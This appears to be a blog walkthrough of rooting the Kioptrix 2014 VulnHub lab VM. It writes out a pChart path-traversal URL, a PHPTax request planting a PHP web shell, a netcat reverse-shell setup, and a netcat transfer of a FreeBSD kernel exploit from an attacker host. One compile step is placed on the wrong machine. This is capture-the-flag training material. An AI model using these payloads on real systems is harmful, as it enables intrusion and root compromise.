---
title: "Kioptrix - 2014"
date: 2020-08-12
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Kioptrix 2014 on VulnHub"
os: "Linux"
platform: "VulnHub"
tags: [OSCP, pChart 2.1.3, PHPTax, FreeBSD 9.0 kernel exploit]
comments: false
---

[Kioptrix]( https://www.vulnhub.com/entry/kioptrix-2014-5,62/) 2014 is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used `netdiscover -i eth0` until I came across the IP of this machine.

![Kioptrix 2014 netdiscover](/images/KioptrixLevel20141.png)

Next I ran `threader3000` to enumerate the ports and let it complete it's suggested nmap scan

![Kioptrix 2014 threader3000 nmap](/images/KioptrixLevel20142.png)

It appears we have two websites open on ports 80 and 8080, let's take a look at both. Let's start with the one on port 80 first.

![Kioptrix 2014 port 80 website](/images/KioptrixLevel20143.png)

This appears to just be the default Apache webpage on older versions of Apache. Let's look at port 8080 next.

![Kioptrix 2014 Port 8080 website](/images/KioptrixLevel20144.png)

I attempted to enumerate the site and gobuster was receiving a numerous amount of errors due to too many requests to both websites, so I decided to look at the source code of the sites, starting with the site on port 80 first. This is where I came across a comment that pointed to a potential directory.

![Kioptrix 2014 port 80 source code](/images/KioptrixLevel20145.png)

I navigated to **/pChart2.1.3/index.php** and the page below appeared.

![Kioptrix 2014 pChart 2.1.3](/images/KioptrixLevel20146.png)

This looked like it rendered various chart types. A quick search for pChart 2.1.3 exploits led me to this article on [exploit-db](https://www.exploit-db.com/exploits/31173). After reviewing the exploit, it appears that we can use it to display data in a file. Let's run `http://[machine ip]/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd` and see what happens.

![Kioptrix 2014 /etc/passwd](/images/KioptrixLevel20147.png)

We are able to view /etc/passwd and uncover that this is running FreeBSD. We know we were not able to get into the website on port 8080, so let's view the apache.conf file with this exploit. A quick Google search turns up [this](https://www.freebsd.org/doc/handbook/network-apache.html) documentation from the FreeBSD website - Apache's default configuration file is found at **/usr/local/etc/apache2x/httpd.conf**, where the x is the version number. With the version in nmap listed as 2.2 earlier, I entered the following **http://[[machine ip]]/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2fusr/local/etc/apache22/httpd.conf**. This pulled up the main Apache configuration file as shown below:

![Kioptrix 2014 Apache configuration](/images/KioptrixLevel20148.png)

At the bottom of the configuration file is the configuration for the website on port 8080. It appears we can access it using a **Mozilla4 browser** user agent.

![Kioptrix 2014 Apache Configuration User Agent](/images/KioptrixLevel20149.png)

Next, I installed [User-Agent Switcher and Manager](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) in Firefox which allows you to switch user agents. I then switched my user agent to **Mozilla/4.0** and clicked on **Apply** (active window).

![Kioptrix 2014 User Agent](/images/KioptrixLevel201410.png)

Next, I navigated to **http://[machine ip]:8080** and I was now able to access this directory. It contains a folder named **phptax**

![Kioptrix 2014 port 8080 website](/images/KioptrixLevel201411.png)

Let's take a look at this site. It appears it is some sort of tax preparation software.

![Kioptrix 2014 PHPTax](/images/KioptrixLevel201412.png)

Let's see if there are any known exploits for this software. I ran `searchsploit phptax` from my attacker PC and 3 results came up.

![Kioptrix 2014 searchsploit](/images/KioptrixLevel201413.png)

I tried all 3 of these exploits and unfortunately was not able to get any of them to work. However, I took a look at the source code of these 3 exploits (this can be done with searchsploit -x [exploit #]). When I ran `searchsploit -x 25849`, I noticed something interesting even though it did not work when I ran it normally.

![Kioptrix 2014 25849 exploit](/images/KioptrixLevel201414.png)

It appears that this creates a php file named **rce.php**. I ran this by typing in **http://[machine ip]:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E";** I didn't get any errors, but I wasn't sure where it saved rce.php to. Poking around it appears that by looking at the **view** portions of the images shows a **/data/pdf** directory I navigated there and it looks like there was some cleanup that hadn't been done from testing on this box initially.

![Kioptrix 2014 /phptax/data/pdf directory](/images/KioptrixLevel201415.png)

unfortunately, rce.php was not here. I moved up to the parent directory. There it is!

![Kioptrix 2014 rce.php location](/images/KioptrixLevel201416.png)

Let's run **http://[machine ip]:8080/phptax/data/rce.php?cmd=id** and see what happens.

![Kioptrix 2014 command injection](/images/KioptrixLevel201417.png)

Great, now we can perform command injection. Let's open up a netcat listener on our attacker pc with `nc -nvlp 4444`.

![Kioptrix 2014 nc listener](/images/KioptrixLevel201418.png)

I tried various [reverse shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and the Perl one worked (after I [url encoded](https://www.urlencoder.org/) it). Once encoded, paste this command after the **rce.php?cmd=** portion and press enter. You should now have a reverse shell.

![Kioptrix 2014 reverse shell](/images/KioptrixLevel201419.png)

Let's run `uname -a`, we can see this is running FreeBSD 9.0.

![Kioptrix 2014 uname -a](/images/KioptrixLevel201420.png)

In another tab on our attacker pc, let's run `searchsploit FreeBSD 9.0`. 

![Kioptrix 2014 searchsploit freebsd 9.0](/images/KioptrixLevel201421.png)

Let's copy the first one listed to our current folder with `searchsploit -m 28718`.

![Kioptrix 2014 28718.c](/images/KioptrixLevel201422.png)

Let's go back to our foothold on the victim computer and see if gcc is present to compile this program.

![Kioptrix 2014 which gcc](/images/KioptrixLevel201423.png)

It is present on our victim. Now we need to get the exploit over to the victim computer. Unfortunately, wget is not installed. Fortunately, we can copy this over with netcat, which is present on our victim computer.

![Kioptrix 2014 wget nc](/images/KioptrixLevel201424.png)

On our **attacker** pc, let's run `nc -lp 4567 < 28718.c`.

![Kioptrix 2014 nc send file](/images/KioptrixLevel201425.png)

Next, on our **victim** pc, let's run `nc [attacker ip] 4567 > 28718.c`. 

![Kioptrix 2014 nc receive file](/images/KioptrixLevel201426.png)

After a few seconds, terminate netcat on the attacker pc with CTRL+C. Go back to the attacker pc and run `gcc -o 28718 28718.c`.

![Kioptrix 2014 gcc compile](/images/KioptrixLevel201427.png)

Now, run the exploit with `./28718` and run `whoami`. We are now root!

![Kioptrix 2014 run exploit](/images/KioptrixLevel201428.png)

Now, let's run `cd /root` and `ls -al`. You will see a congrats.txt file in there, so run `cat congrats.txt` to finish this box!

![Kioptrix 2014 root access](/images/KioptrixLevel201429.png)



